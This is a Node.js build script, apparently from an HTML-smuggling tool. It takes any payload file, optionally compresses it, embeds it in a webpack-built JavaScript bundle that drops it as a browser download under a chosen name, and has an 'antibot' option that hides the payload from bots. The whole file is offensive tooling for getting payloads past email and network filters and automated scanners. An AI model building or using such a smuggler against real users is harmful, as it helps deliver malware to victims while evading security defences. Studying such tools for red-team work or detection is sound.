/* eslint-disable no-console */
/* eslint-disable import/no-extraneous-dependencies */
const fs = require("fs");
const { program } = require("commander");
const webpack = require("webpack");
const fflate = require("fflate");
const webpackConfig = require("./webpack.config");

program
  .requiredOption(
    "-p, --payload <string>",
    "Path to payload file you want to smuggle"
  )
  .requiredOption(
    "-n, --name <string>",
    "Name of file, that would be downloaded"
  )
  .option(
    "-t, --type <string>",
    "Contet-Type of downlonaded file",
    "application/octet-stream"
  )
  .option("-f, --function <string>", "Name of exported function", "download")
  .option("-c, --compress", "Enable payload compression (gzip)")
  .option("-a, --antibot", "Enable bot detection and block them (recommended)");

program.parse();

console.log("Using payload:", program.opts().payload);
console.log("Using filename:", program.opts().name);
console.log("Using Content-Type:", program.opts().type);
console.log("Exported function:", program.opts().function);
console.log("Compression:", program.opts().compress);
console.log("Antibot:", program.opts().antibot);

const dst = "src/assets/payload.bin";
fs.readFile(program.opts().payload, { encoding: "latin1" }, (err, data) => {
  if (err) throw err;

  const aData = fflate.strToU8(data, true);
  const payload = program.opts().compress
    ? fflate.compressSync(aData, { level: 9, mem: 12 })
    : aData;
  console.log("Payload size:", payload.length);

  fs.writeFile(dst, payload, { flag: "w+" }, (err2) => {
    if (err2) throw err2;

    const compiler = webpack(
      webpackConfig({
        filetype: program.opts().type,
        filename: program.opts().name,
        funcname: program.opts().function,
        compress: program.opts().compress,
        antibot: program.opts().antibot,
      })
    );
    compiler.run((err3, stats) => {
      if (err3) throw err3;
      console.log(
        stats.toString({
          colors: true,
        })
      );
    });
  });
});
